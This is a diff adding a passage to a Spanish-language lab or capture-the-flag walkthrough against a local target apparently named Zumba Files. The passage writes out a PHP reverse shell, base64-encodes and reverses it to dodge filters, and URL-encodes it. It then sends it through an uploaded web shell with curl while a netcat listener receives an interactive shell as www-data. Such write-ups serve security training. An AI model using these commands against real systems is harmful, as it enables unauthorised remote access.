@@ -180,6 +180,43 @@ curl "http://172.17.0.2/uploads/ghost.php?cmd=cat%20%2Fetc%2Fcron.d%2Fzumba-back
 # Copia de seguridad de las subidas de Zumba Files (cada minuto)
 * * * * * root /opt/zumba/backup.sh >/dev/null 2>&1
 ```
+Para poder analizar mejor el script vamos a realizar una ejecucion remota de comandos.
+
+```text
+php -r '$sock=fsockopen("172.17.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+Pero, para poder ejecutar esta línea primero vamos a codificar la PHP Reverse Shell en base64 y luego la vamos a invertir el resultado (fíjese que hemos tenido que modificar un poco la PHP Reverse Shell para que esta pueda ser leída):
+
+```text
+echo "php -r '\$sock=fsockopen(\"172.17.0.1\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" | base64 -w 0 | rev
+=owJ7kiIzYiPyAyMm4DIzYCPgkWLgg2cv4Wai9iIoMWZ4V2OpQDN0QDLiEjLw4yNx4iM3EjIo4WZw92aj92cm1zaj92ckcCIy1CIwhGc
+```
+Ya tenemos la línea del PHP Reverse Shell a usar. Básicamente, es realizar el proceso contrario, pero esta vez para que sea ejecutado en un navegador web:
+
+```text
+echo "=owJ7kiIzYiPyAyMm4DIzYCPgkWLgg2cv4Wai9iIoMWZ4V2OpQDN0QDLiEjLw4yNx4iM3EjIo4WZw92aj92cm1zaj92ckcCIy1CIwhGc" | rev | base64 -d | bash
+```
+Pero, aun falta un paso más para que esté lista, debemos convertir toda esta línea a un formato entendible por un navegador web como hemos hecho en los casos anteriores:
+
+```text
+echo%20%22%3DowJ7kiIzYiPyAyMm4DIzYCPgkWLgg2cv4Wai9iIoMWZ4V2OpQDN0QDLiEjLw4yNx4iM3EjIo4WZw92aj92cm1zaj92ckcCIy1CIwhGc%22%20%7C%20rev%20%7C%20base64%20-d%20%7C%20bash
+```
+Desde otra terminal en Kali ejecutamos lo siguiente y lo dejamos escuchando:
+
+```bash
+sudo rlwrap nc -nvlp 4444
+```
+Luego ejecutamos lo siguiente desde la primera terminal:
+
+```bash
+curl "http://172.17.0.2/uploads/ghost.php?cmd=echo%20%22%3DowJ7kiIzYiPyAyMm4DIzYCPgkWLgg2cv4Wai9iIoMWZ4V2OpQDN0QDLiEjLw4yNx4iM3EjIo4WZw92aj92cm1zaj92ckcCIy1CIwhGc%22%20%7C%20rev%20%7C%20base64%20-d%20%7C%20bash"
+```
+Desde la segunda terminal podemos observar que hemos ingresado al equipo víctima y como el usuario “www-data”:
+
+```bash
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 El script contiene: cat /opt/zumba/backup.sh
 
